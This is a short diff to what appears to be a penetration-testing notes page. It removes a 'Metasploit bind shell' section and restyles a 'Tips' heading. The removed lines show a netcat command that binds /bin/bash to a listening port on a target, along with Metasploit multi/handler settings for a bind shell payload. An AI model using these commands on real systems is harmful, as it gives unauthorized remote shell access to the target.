@@ -18,22 +18,7 @@
 
 
 
-## Metasploit bind shell
-
-<pre class="language-sh"><code class="lang-sh"># target
-<strong>nc -lvnp &#x3C;target_port> -e /bin/bash 
-</strong>
-# attacker
-use multi/handler
-set payload generic/shell_bind_tcp
-set rhost &#x3C;target>
-set lport 9015
-run
-</code></pre>
-
-
-
-Tips
+### **Tips**
 
 **Finding hidden directory**
 
